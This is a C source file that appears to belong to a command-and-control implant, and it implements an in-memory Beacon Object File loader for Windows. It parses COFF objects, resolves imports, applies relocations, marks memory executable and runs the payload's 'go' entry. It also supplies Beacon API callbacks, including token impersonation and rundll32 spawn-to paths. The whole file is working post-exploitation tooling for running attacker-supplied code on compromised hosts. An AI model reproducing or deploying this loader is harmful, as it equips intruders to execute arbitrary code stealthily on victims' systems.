#ifdef _WIN32
/*
 * bof.c — COFF/BOF executor for the C Windows agent.
 *
 * Ported from agents/agent-go/bof_windows.go (authoritative reference).
 * Supports AMD64 COFF only (machine == 0x8664).
 */
#include "bof.h"
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdarg.h>
#include <ctype.h>

/* ── AMD64 COFF relocation type codes ─────────────────────────────────────── */
#define IMAGE_REL_AMD64_ADDR64   0x0001
#define IMAGE_REL_AMD64_ADDR32NB 0x0003
#define IMAGE_REL_AMD64_REL32    0x0004
#define IMAGE_REL_AMD64_REL32_1  0x0005
#define IMAGE_REL_AMD64_REL32_2  0x0006
#define IMAGE_REL_AMD64_REL32_3  0x0007
#define IMAGE_REL_AMD64_REL32_4  0x0008
#define IMAGE_REL_AMD64_REL32_5  0x0009

/* ── datap / formatp layouts — must match beacon.h on x64 ─────────────────
 * Each field: original=8, buffer=8, length=4, size=4 → total 24 bytes.    */
typedef struct {
    char *original;
    char *buffer;
    int   length;
    int   size;
} bof_datap;

typedef struct {
    char *original;
    char *buffer;
    int   length;
    int   size;
} bof_formatp;

/* ── Global output buffer (written by BeaconOutput / BeaconPrintf) ─────────
 * Protected by g_bof_cs; valid only while a BOF is executing.              */
static char   *g_bof_out     = NULL;
static size_t  g_bof_out_len = 0;
static size_t  g_bof_out_cap = 0;

static void bof_out_append(const char *data, size_t n) {
    if (!data || n == 0) return;
    if (g_bof_out_len + n + 1 > g_bof_out_cap) {
        size_t ncap = g_bof_out_cap ? g_bof_out_cap * 2 : 4096;
        while (ncap < g_bof_out_len + n + 1) ncap *= 2;
        char *nb = (char *)realloc(g_bof_out, ncap);
        if (!nb) return;
        g_bof_out     = nb;
        g_bof_out_cap = ncap;
    }
    memcpy(g_bof_out + g_bof_out_len, data, n);
    g_bof_out_len += n;
    g_bof_out[g_bof_out_len] = '\0';
}

/* ── VirtualAlloc tracking (freed after each BOF run) ──────────────────── */
#define BOF_MAX_ALLOCS 512
static void *g_allocs[BOF_MAX_ALLOCS];
static int   g_alloc_count = 0;

static void bof_track(void *p) {
    if (p && g_alloc_count < BOF_MAX_ALLOCS)
        g_allocs[g_alloc_count++] = p;
}

static void bof_free_allocs(void) {
    for (int i = 0; i < g_alloc_count; i++)
        VirtualFree(g_allocs[i], 0, MEM_RELEASE);
    g_alloc_count = 0;
}

/* ── formatp buffer store (keyed by formatp* pointer) ──────────────────── */
#define BOF_MAX_FMTBUFS 32
typedef struct {
    void  *key;
    char  *data;
    size_t len;
    size_t cap;
} FmtBuf;
static FmtBuf g_fmt_bufs[BOF_MAX_FMTBUFS];
static int    g_fmt_count = 0;

static FmtBuf *fmt_find(void *key) {
    for (int i = 0; i < g_fmt_count; i++)
        if (g_fmt_bufs[i].key == key) return &g_fmt_bufs[i];
    return NULL;
}
static void fmt_buf_append(FmtBuf *fb, const char *data, size_t n) {
    if (!data || n == 0) return;
    if (fb->len + n + 1 > fb->cap) {
        size_t ncap = fb->cap ? fb->cap * 2 : 256;
        while (ncap < fb->len + n + 1) ncap *= 2;
        char *nb = (char *)realloc(fb->data, ncap);
        if (!nb) return;
        fb->data = nb;
        fb->cap  = ncap;
    }
    memcpy(fb->data + fb->len, data, n);
    fb->len += n;
    fb->data[fb->len] = '\0';
}
static void fmt_free_all(void) {
    for (int i = 0; i < g_fmt_count; i++) free(g_fmt_bufs[i].data);
    memset(g_fmt_bufs, 0, sizeof(g_fmt_bufs));
    g_fmt_count = 0;
}

/* ── Mutex: one BOF at a time ───────────────────────────────────────────── */
static CRITICAL_SECTION g_bof_cs;
static int              g_bof_cs_ready = 0;
static void bof_cs_init(void) {
    if (!g_bof_cs_ready) {
        InitializeCriticalSection(&g_bof_cs);
        g_bof_cs_ready = 1;
    }
}

/* ── bswap helpers (BOF wire format is big-endian) ─────────────────────── */
static int32_t bof_bswap32(int32_t v) {
    uint32_t u = (uint32_t)v;
    return (int32_t)((u >> 24) | ((u >> 8) & 0x0000ff00u) |
                     ((u << 8) & 0x00ff0000u) | (u << 24));
}
static uint16_t bof_bswap16(uint16_t v) {
    return (uint16_t)((v >> 8) | (v << 8));
}

/* ── Beacon API callback implementations ────────────────────────────────── */

static void __cdecl cb_BeaconDataParse(bof_datap *p, char *buf, int len) {
    p->original = buf;
    p->buffer   = buf;
    p->length   = len;
    p->size     = len;
}

static int __cdecl cb_BeaconDataInt(bof_datap *p) {
    if (p->length < 4) return 0;
    int32_t v; memcpy(&v, p->buffer, 4);
    p->buffer += 4; p->length -= 4;
    return (int)bof_bswap32(v);
}

static int __cdecl cb_BeaconDataShort(bof_datap *p) {
    if (p->length < 2) return 0;
    uint16_t v; memcpy(&v, p->buffer, 2);
    p->buffer += 2; p->length -= 2;
    return (int)bof_bswap16(v);
}

static int __cdecl cb_BeaconDataLength(bof_datap *p) {
    return p->length;
}

static char * __cdecl cb_BeaconDataExtract(bof_datap *p, int *out_sz) {
    if (p->length < 4) return NULL;
    int32_t ln_be; memcpy(&ln_be, p->buffer, 4);
    int32_t ln = bof_bswap32(ln_be);
    p->buffer += 4; p->length -= 4;
    if (ln < 0 || ln > p->length) return NULL;
    char *out = p->buffer;
    p->buffer += ln; p->length -= ln;
    if (out_sz) *out_sz = (int)ln;
    return out;
}

static void __cdecl cb_BeaconOutput(int type, char *data, int len) {
    (void)type;
    if (data && len > 0) bof_out_append(data, (size_t)len);
}

static void __cdecl cb_BeaconPrintf(int type, const char *fmt, ...) {
    (void)type;
    if (!fmt) return;
    char buf[4096];
    va_list va; va_start(va, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, va);
    va_end(va);
    if (n > 0) bof_out_append(buf, (size_t)n);
}

static void __cdecl cb_BeaconFormatAlloc(bof_formatp *fp, int maxsz) {
    if (g_fmt_count < BOF_MAX_FMTBUFS) {
        FmtBuf *fb = &g_fmt_bufs[g_fmt_count++];
        fb->key  = fp;
        fb->data = NULL;
        fb->len  = 0;
        fb->cap  = 0;
    }
    fp->original = NULL;
    fp->buffer   = NULL;
    fp->length   = 0;
    fp->size     = maxsz;
}

static void __cdecl cb_BeaconFormatReset(bof_formatp *fp) {
    FmtBuf *fb = fmt_find(fp);
    if (fb) { fb->len = 0; if (fb->data) fb->data[0] = '\0'; }
    fp->length = 0;
}

static void __cdecl cb_BeaconFormatFree(bof_formatp *fp) {
    for (int i = 0; i < g_fmt_count; i++) {
        if (g_fmt_bufs[i].key == fp) {
            free(g_fmt_bufs[i].data);
            g_fmt_bufs[i] = g_fmt_bufs[--g_fmt_count];
            memset(&g_fmt_bufs[g_fmt_count], 0, sizeof(FmtBuf));
            return;
        }
    }
}

static void __cdecl cb_BeaconFormatAppend(bof_formatp *fp, char *text, int ln) {
    if (!text || ln <= 0) return;
    FmtBuf *fb = fmt_find(fp);
    if (fb) { fmt_buf_append(fb, text, (size_t)ln); fp->length += ln; }
}

static void __cdecl cb_BeaconFormatPrintf(bof_formatp *fp, const char *fmt, ...) {
    if (!fmt) return;
    char buf[4096];
    va_list va; va_start(va, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, va);
    va_end(va);
    if (n <= 0) return;
    FmtBuf *fb = fmt_find(fp);
    if (fb) { fmt_buf_append(fb, buf, (size_t)n); fp->length += n; }
}

static char * __cdecl cb_BeaconFormatToStr(bof_formatp *fp, int *out_sz) {
    FmtBuf *fb = fmt_find(fp);
    if (!fb || !fb->data) { if (out_sz) *out_sz = 0; return NULL; }
    size_t n = fb->len;
    char *mem = (char *)VirtualAlloc(NULL, n + 1,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { if (out_sz) *out_sz = 0; return NULL; }
    bof_track(mem);
    memcpy(mem, fb->data, n);
    mem[n] = '\0';
    if (out_sz) *out_sz = (int)n;
    fp->original = mem;
    return mem;
}

static void __cdecl cb_BeaconFormatInt(bof_formatp *fp, int value) {
    int32_t be = bof_bswap32((int32_t)value);
    FmtBuf *fb = fmt_find(fp);
    if (fb) { fmt_buf_append(fb, (char *)&be, 4); fp->length += 4; }
}

static BOOL __cdecl cb_BeaconIsAdmin(void) {
    HANDLE token = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
        return FALSE;
    TOKEN_ELEVATION elev; DWORD sz = 0;
    BOOL ret = FALSE;
    if (GetTokenInformation(token, TokenElevation, &elev, sizeof(elev), &sz))
        ret = elev.TokenIsElevated ? TRUE : FALSE;
    CloseHandle(token);
    return ret;
}

static void __cdecl cb_BeaconGetSpawnTo(BOOL x86, char *buf, int sz) {
    const char *path = x86
        ? "C:\\Windows\\SysWOW64\\rundll32.exe"
        : "C:\\Windows\\System32\\rundll32.exe";
    strncpy(buf, path, (size_t)(sz - 1));
    buf[sz - 1] = '\0';
}

static int __cdecl cb_toWideChar(char *src, wchar_t *dst, int max_chars) {
    return MultiByteToWideChar(CP_UTF8, 0, src, -1, dst, max_chars);
}

/* no-op stubs for injection / token / sleep APIs */
static void __cdecl cb_BeaconInjectProcess(void)         {}
static void __cdecl cb_BeaconInjectTemporaryProcess(void) {}
static void __cdecl cb_BeaconCleanupProcess(void)        {}
static void __cdecl cb_BeaconSpawnTemporaryProcess(void) {}
static BOOL __cdecl cb_BeaconRevertToken(void)  { return RevertToSelf(); }
static BOOL __cdecl cb_BeaconUseToken(HANDLE h) { return ImpersonateLoggedOnUser(h); }
static void __cdecl cb_BeaconSetSleep(int ms, int jitter) { (void)ms; (void)jitter; }

/* ── Beacon API name → function pointer table ───────────────────────────── */
typedef struct { const char *name; void *fn; } BeaconApiEntry;
static const BeaconApiEntry g_beacon_api[] = {
    { "BeaconDataParse",              (void *)cb_BeaconDataParse },
    { "BeaconDataInt",                (void *)cb_BeaconDataInt },
    { "BeaconDataShort",              (void *)cb_BeaconDataShort },
    { "BeaconDataLength",             (void *)cb_BeaconDataLength },
    { "BeaconDataExtract",            (void *)cb_BeaconDataExtract },
    { "BeaconOutput",                 (void *)cb_BeaconOutput },
    { "BeaconPrintf",                 (void *)cb_BeaconPrintf },
    { "BeaconFormatAlloc",            (void *)cb_BeaconFormatAlloc },
    { "BeaconFormatReset",            (void *)cb_BeaconFormatReset },
    { "BeaconFormatFree",             (void *)cb_BeaconFormatFree },
    { "BeaconFormatAppend",           (void *)cb_BeaconFormatAppend },
    { "BeaconFormatPrintf",           (void *)cb_BeaconFormatPrintf },
    { "BeaconFormatToString",         (void *)cb_BeaconFormatToStr },
    { "BeaconFormatInt",              (void *)cb_BeaconFormatInt },
    { "BeaconIsAdmin",                (void *)cb_BeaconIsAdmin },
    { "BeaconGetSpawnTo",             (void *)cb_BeaconGetSpawnTo },
    { "toWideChar",                   (void *)cb_toWideChar },
    { "BeaconInjectProcess",          (void *)cb_BeaconInjectProcess },
    { "BeaconInjectTemporaryProcess", (void *)cb_BeaconInjectTemporaryProcess },
    { "BeaconCleanupProcess",         (void *)cb_BeaconCleanupProcess },
    { "BeaconSpawnTemporaryProcess",  (void *)cb_BeaconSpawnTemporaryProcess },
    { "BeaconRevertToken",            (void *)cb_BeaconRevertToken },
    { "BeaconUseToken",               (void *)cb_BeaconUseToken },
    { "BeaconSetSleep",               (void *)cb_BeaconSetSleep },
    { NULL, NULL }
};

static void *beacon_api_lookup(const char *name) {
    for (int i = 0; g_beacon_api[i].name; i++)
        if (strcmp(g_beacon_api[i].name, name) == 0)
            return g_beacon_api[i].fn;
    return NULL;
}

/* ── External symbol resolution ─────────────────────────────────────────────
 * Handles only __imp_-prefixed names (the COFF import convention).
 *
 * KERNEL32$VirtualAlloc  → LoadLibrary("kernel32.dll") + GetProcAddress
 * BeaconDataParse etc.   → static callback above
 * plain names            → try ntdll / kernel32 / user32
 *
 * Returns a VirtualAlloc'd 8-byte slot whose first qword is the resolved
 * function pointer (the BOF's ADDR64 relocation writes the slot address into
 * the import cell, and the BOF dereferences it at call time).               */
static void *resolve_external(const char *name) {
    if (strncmp(name, "__imp_", 6) != 0) return NULL;
    const char *imp_name = name + 6;

    void *fn = NULL;
    const char *dollar = strchr(imp_name, '$');

    if (dollar) {
        /* DLL$FuncName format */
        size_t dll_len = (size_t)(dollar - imp_name);
        char dll_name[260];
        if (dll_len + 5 >= sizeof(dll_name)) return NULL;
        memcpy(dll_name, imp_name, dll_len);
        for (size_t i = 0; i < dll_len; i++)
            dll_name[i] = (char)tolower((unsigned char)dll_name[i]);
        memcpy(dll_name + dll_len, ".dll", 5);
        HMODULE hm = LoadLibraryA(dll_name);
        if (hm) fn = (void *)GetProcAddress(hm, dollar + 1);
    } else {
        /* Beacon API first, then common system DLLs */
        fn = beacon_api_lookup(imp_name);
        if (!fn) {
            static const char *common_dlls[] = {
                "ntdll.dll", "kernel32.dll", "user32.dll", NULL
            };
            for (int i = 0; common_dlls[i] && !fn; i++) {
                HMODULE hm = GetModuleHandleA(common_dlls[i]);
                if (!hm) hm = LoadLibraryA(common_dlls[i]);
                if (hm) fn = (void *)GetProcAddress(hm, imp_name);
            }
        }
    }

    if (!fn) return NULL;

    /* Allocate the 8-byte import thunk slot */
    void **thunk = (void **)VirtualAlloc(NULL, 8,
                                         MEM_COMMIT | MEM_RESERVE,
                                         PAGE_READWRITE);
    if (!thunk) return NULL;
    bof_track(thunk);
    *thunk = fn;
    return thunk;  /* pointer to the slot; BOF resolves fn via double-deref */
}

/* ── Relocation application ─────────────────────────────────────────────── */
static void apply_reloc(uint8_t *patch, uint64_t target, uint16_t type) {
    switch (type) {
    case IMAGE_REL_AMD64_ADDR64: {
        uint64_t v; memcpy(&v, patch, 8);
        v += target;
        memcpy(patch, &v, 8);
        break;
    }
    case IMAGE_REL_AMD64_REL32:
    case IMAGE_REL_AMD64_REL32_1:
    case IMAGE_REL_AMD64_REL32_2:
    case IMAGE_REL_AMD64_REL32_3:
    case IMAGE_REL_AMD64_REL32_4:
    case IMAGE_REL_AMD64_REL32_5: {
        uint32_t n_bias = (uint32_t)(type - IMAGE_REL_AMD64_REL32); /* 0..5 */
        int32_t existing; memcpy(&existing, patch, 4);
        int64_t next = (int64_t)(uintptr_t)patch + 4 + (int64_t)n_bias;
        int32_t result = (int32_t)((int64_t)target + (int64_t)existing - next);
        memcpy(patch, &result, 4);
        break;
    }
    case IMAGE_REL_AMD64_ADDR32NB: {
        int32_t existing; memcpy(&existing, patch, 4);
        int32_t result = (int32_t)((int64_t)target + (int64_t)existing);
        memcpy(patch, &result, 4);
        break;
    }
    default: break;
    }
}

/* ── Per-section info ───────────────────────────────────────────────────── */
typedef struct {
    uint8_t *mem;
    size_t   size;
    uint32_t chars;
} SecInfo;

/* ── Per-symbol info ────────────────────────────────────────────────────── */
typedef struct {
    char     name[128];
    int16_t  sec_num;
    uint32_t value;
} SymRec;

/* ── Main entry point ───────────────────────────────────────────────────── */
char *bof_exec(const uint8_t *coff_data, size_t coff_len,
               const uint8_t *packed_args, size_t args_len) {
    /* All vars declared at top so goto cleanup is safe in C99 */
    char     *result    = NULL;
    SecInfo  *secs      = NULL;
    SymRec   *sym_recs  = NULL;
    uint8_t **sym_addrs = NULL;

    bof_cs_init();
    EnterCriticalSection(&g_bof_cs);

    /* Reset per-run globals */
    free(g_bof_out);
    g_bof_out     = NULL;
    g_bof_out_len = 0;
    g_bof_out_cap = 0;
    fmt_free_all();
    g_alloc_count = 0;

    /* ── Validate COFF header ──────────────────────────────────────────── */
    if (coff_len < 20) { result = strdup("[bof] COFF too small"); goto cleanup; }

    uint16_t machine; memcpy(&machine, coff_data, 2);
    if (machine != 0x8664) { result = strdup("[bof] not AMD64 COFF"); goto cleanup; }

    uint16_t num_sections; memcpy(&num_sections, coff_data + 2,  2);
    uint32_t sym_tab_off;  memcpy(&sym_tab_off,  coff_data + 8,  4);
    uint32_t num_symbols;  memcpy(&num_symbols,  coff_data + 12, 4);
    uint16_t opt_hdr_size; memcpy(&opt_hdr_size, coff_data + 16, 2);
    size_t sec_base = 20 + (size_t)opt_hdr_size;

    /* ── Allocate & populate sections ────────────────────────────────────── */
    if (num_sections == 0) { result = strdup("[bof] no sections"); goto cleanup; }
    secs = (SecInfo *)calloc(num_sections, sizeof(SecInfo));
    if (!secs) { result = strdup("[bof] oom (secs)"); goto cleanup; }

    for (int i = 0; i < (int)num_sections; i++) {
        size_t hdr_off = sec_base + (size_t)i * 40;
        if (hdr_off + 40 > coff_len) { result = strdup("[bof] section hdr OOB"); goto cleanup; }
        const uint8_t *h = coff_data + hdr_off;
        uint32_t virt_size, raw_size, raw_off, chars;
        memcpy(&virt_size, h +  8, 4);
        memcpy(&raw_size,  h + 16, 4);
        memcpy(&raw_off,   h + 20, 4);
        memcpy(&chars,     h + 36, 4);

        size_t alloc_size = (raw_size > virt_size) ? (size_t)raw_size : (size_t)virt_size;
        if (alloc_size == 0) continue;

        uint8_t *mem = (uint8_t *)VirtualAlloc(NULL, alloc_size,
                                               MEM_COMMIT | MEM_RESERVE,
                                               PAGE_READWRITE);
        if (!mem) { result = strdup("[bof] VirtualAlloc section failed"); goto cleanup; }
        bof_track(mem);
        memset(mem, 0, alloc_size);

        if (raw_size > 0) {
            if ((size_t)raw_off + (size_t)raw_size > coff_len) {
                result = strdup("[bof] section raw data OOB"); goto cleanup;
            }
            memcpy(mem, coff_data + raw_off, raw_size);
        }
        secs[i].mem   = mem;
        secs[i].size  = alloc_size;
        secs[i].chars = chars;
    }

    /* ── Parse symbol table ──────────────────────────────────────────────── */
    if (!sym_tab_off || !num_symbols) {
        result = strdup("[bof] no symbol table");
        goto cleanup;
    }
    size_t str_tab_off = (size_t)sym_tab_off + (size_t)num_symbols * 18;

    sym_recs  = (SymRec *)  calloc(num_symbols, sizeof(SymRec));
    sym_addrs = (uint8_t **)calloc(num_symbols, sizeof(uint8_t *));
    if (!sym_recs || !sym_addrs) { result = strdup("[bof] oom (syms)"); goto cleanup; }

    for (int i = 0; i < (int)num_symbols; ) {
        size_t off = (size_t)sym_tab_off + (size_t)i * 18;
        if (off + 18 > coff_len) break;
        const uint8_t *sym = coff_data + off;

        /* Decode symbol name: first 4 bytes == 0 → string table offset */
        uint32_t first4; memcpy(&first4, sym, 4);
        if (first4 == 0) {
            uint32_t str_off; memcpy(&str_off, sym + 4, 4);
            size_t abs = str_tab_off + (size_t)str_off;
            if (abs < coff_len) {
                const char *s = (const char *)coff_data + abs;
                size_t avail = coff_len - abs;
                size_t n = 0;
                while (n < avail && n < 127 && s[n]) n++;
                memcpy(sym_recs[i].name, s, n);
                sym_recs[i].name[n] = '\0';
            }
        } else {
            /* Inline name: up to 8 bytes, may not be NUL-terminated */
            size_t n = 0;
            while (n < 8 && sym[n]) n++;
            memcpy(sym_recs[i].name, sym, n);
            sym_recs[i].name[n] = '\0';
        }

        int16_t  sec_num; memcpy(&sec_num, sym + 12, 2);
        uint32_t value;   memcpy(&value,   sym +  8, 4);
        sym_recs[i].sec_num = sec_num;
        sym_recs[i].value   = value;

        if (sec_num > 0 && sec_num <= (int16_t)num_sections) {
            int si = (int)sec_num - 1;
            if (secs[si].mem)
                sym_addrs[i] = secs[si].mem + (size_t)value;
        }

        int aux = (int)sym[17];
        i += 1 + aux;
    }

    /* ── Resolve external symbols ────────────────────────────────────────── */
    for (int i = 0; i < (int)num_symbols; ) {
        if (sym_recs[i].sec_num == 0 && sym_recs[i].name[0] && !sym_addrs[i]) {
            void *addr = resolve_external(sym_recs[i].name);
            /* NULL is acceptable — BOF may not call the symbol */
            sym_addrs[i] = (uint8_t *)addr;
        }
        size_t off = (size_t)sym_tab_off + (size_t)i * 18;
        int aux = (off + 18 <= coff_len) ? (int)coff_data[off + 17] : 0;
        i += 1 + aux;
    }

    /* ── Apply relocations ───────────────────────────────────────────────── */
    for (int i = 0; i < (int)num_sections; i++) {
        if (!secs[i].mem) continue;
        size_t hdr_off = sec_base + (size_t)i * 40;
        const uint8_t *h = coff_data + hdr_off;
        uint16_t num_relocs; memcpy(&num_relocs, h + 32, 2);
        uint32_t rel_off;    memcpy(&rel_off,    h + 24, 4);

        for (int j = 0; j < (int)num_relocs; j++) {
            size_t r_off = (size_t)rel_off + (size_t)j * 10;
            if (r_off + 10 > coff_len) break;
            const uint8_t *rel = coff_data + r_off;
            uint32_t virt_addr; memcpy(&virt_addr, rel + 0, 4);
            uint32_t sym_idx;   memcpy(&sym_idx,   rel + 4, 4);
            uint16_t rel_type;  memcpy(&rel_type,  rel + 8, 2);
            if (sym_idx >= num_symbols) continue;
            uint64_t target = (uint64_t)(uintptr_t)sym_addrs[sym_idx];
            uint8_t *patch  = secs[i].mem + (size_t)virt_addr;
            apply_reloc(patch, target, rel_type);
        }
    }

    /* ── Finalise section permissions ────────────────────────────────────── */
    for (int i = 0; i < (int)num_sections; i++) {
        if (!secs[i].mem) continue;
        int exec  = (secs[i].chars & 0x20000000u) != 0;
        int write = (secs[i].chars & 0x80000000u) != 0;
        DWORD prot;
        if      (exec && write) prot = PAGE_EXECUTE_READWRITE;
        else if (exec)          prot = PAGE_EXECUTE_READ;
        else if (write)         prot = PAGE_READWRITE;
        else                    prot = PAGE_READONLY;
        DWORD old;
        VirtualProtect(secs[i].mem, secs[i].size, prot, &old);
    }

    /* ── Find "go" entry point ───────────────────────────────────────────── */
    uint8_t *entry = NULL;
    for (int i = 0; i < (int)num_symbols; ) {
        if (strcmp(sym_recs[i].name, "go") == 0 &&
            sym_recs[i].sec_num > 0 &&
            sym_recs[i].sec_num <= (int16_t)num_sections) {
            int si = (int)sym_recs[i].sec_num - 1;
            if (secs[si].mem)
                entry = secs[si].mem + (size_t)sym_recs[i].value;
            break;
        }
        size_t off = (size_t)sym_tab_off + (size_t)i * 18;
        int aux = (off + 18 <= coff_len) ? (int)coff_data[off + 17] : 0;
        i += 1 + aux;
    }
    if (!entry) { result = strdup("[bof] entry 'go' not found"); goto cleanup; }

    /* ── Copy args into stable VirtualAlloc'd memory ─────────────────────── */
    uint8_t *args_mem = NULL;
    size_t   args_sz  = 0;
    if (packed_args && args_len > 0) {
        args_mem = (uint8_t *)VirtualAlloc(NULL, args_len,
                                           MEM_COMMIT | MEM_RESERVE,
                                           PAGE_READWRITE);
        if (args_mem) {
            bof_track(args_mem);
            memcpy(args_mem, packed_args, args_len);
            args_sz = args_len;
        }
    }

    /* ── Execute BOF ─────────────────────────────────────────────────────── */
    typedef void (*bof_entry_t)(char *, int);
    ((bof_entry_t)entry)((char *)args_mem, (int)args_sz);

    /* ── Collect output ──────────────────────────────────────────────────── */
    if (g_bof_out && g_bof_out_len > 0) {
        result = (char *)malloc(g_bof_out_len + 1);
        if (result) {
            memcpy(result, g_bof_out, g_bof_out_len);
            result[g_bof_out_len] = '\0';
        }
    } else {
        result = strdup("[bof] (no output)");
    }

cleanup:
    free(secs);
    free(sym_recs);
    free(sym_addrs);
    free(g_bof_out);
    g_bof_out     = NULL;
    g_bof_out_len = 0;
    g_bof_out_cap = 0;
    fmt_free_all();
    bof_free_allocs();
    LeaveCriticalSection(&g_bof_cs);
    return result ? result : strdup("[bof] internal error");
}

#endif /* _WIN32 */
